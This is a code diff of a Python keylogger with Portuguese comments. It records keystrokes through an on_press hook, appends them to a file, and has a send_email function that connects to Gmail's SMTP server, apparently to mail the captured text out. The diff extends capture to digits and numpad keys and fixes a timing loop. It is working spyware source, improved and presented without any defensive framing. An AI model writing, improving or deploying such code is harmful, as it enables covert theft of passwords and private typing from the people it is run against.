@@ -14,10 +14,12 @@ keys_pressed = []
 # PT: Escolha uma função on_press. A primeira salva o texto formatado, enquanto a segunda não.
 def on_press(key):
     try:
-        if hasattr(key, 'char') and key.char and key.char.isalpha():
+        if hasattr(key, 'char') and key.char and (key.char.isalpha() or key.char.isdigit()):
             keys_pressed.append(key.char)
         elif key == Key.space:
             keys_pressed.append(" ")
+        elif hasattr(key,"vk") and 96 <= key.vk <= 105:
+            keys_pressed.append(str(key.vk - 96))
     except AttributeError:
         pass
 
@@ -30,7 +32,7 @@ def write_file():
             with open(file, "a") as f:
                 f.write("".join(keys_pressed))
             keys_pressed.clear()
-            time.sleep(1)
+        time.sleep(1)
 
 def send_email():
     server = smtplib.SMTP("smtp.gmail.com", 587)
